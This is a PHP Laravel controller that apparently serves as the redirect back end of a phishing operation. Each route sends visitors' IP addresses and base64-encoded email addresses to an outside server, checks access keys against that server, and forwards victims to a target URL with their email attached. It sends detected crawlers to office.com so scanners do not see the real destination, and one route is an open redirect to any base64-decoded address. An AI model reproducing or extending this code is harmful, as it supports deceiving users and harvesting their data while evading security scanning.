<?php

namespace App\Http\Controllers;

use App\saveEmail;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
use Crawler;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;


    function get_ip() {
        $keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');

        foreach ($keys as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                        return $ip;
                    }
                }
            }
        }
    }

    public function index(){

//        $data = saveEmail::where('ip',request()->ip())->latest()->first();
//        return $data;
        $data =   Http::post("https://natrium100gram.site/public/api/savemequeen",[
            "ip" => $this->get_ip(),
        ]);
//        return $data["target"];

        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
//            $final = ;
//            return base64_decode($data->target).base64_decode($data->email);
            return redirect()->away($data["target"].$data["email"]);

        }
    }

    public function index2(Request $request){
        $decode = base64_decode($request->subs);
        $decode2 = explode("#",$decode)[1];
        $email = explode("&",$decode2)[0];
        $key_red  = explode("&",$decode2)[1];
//        return $key_red;

        $key_val = Http::get("https://natrium100gram.site/public/api/validate_key/".$key_red);
        if ($key_val->successful()){
            $target = $key_val["url_target"];

            $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
                "ip" => $this->get_ip(),
                "subs" => base64_encode($email) ,
                "target" => $target,
            ]);
            if ($send->successful()){
                return $send->body();
            }else{
                return redirect()->away("https://office.com");
            }

        }else{
            return $key_val->status();
        }


//        return $send->body();

    }

    public function code($code){
        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
            $base64 = base64_decode($code);
//            dd($base64);
            return redirect()->away($base64);

        }
    }
}
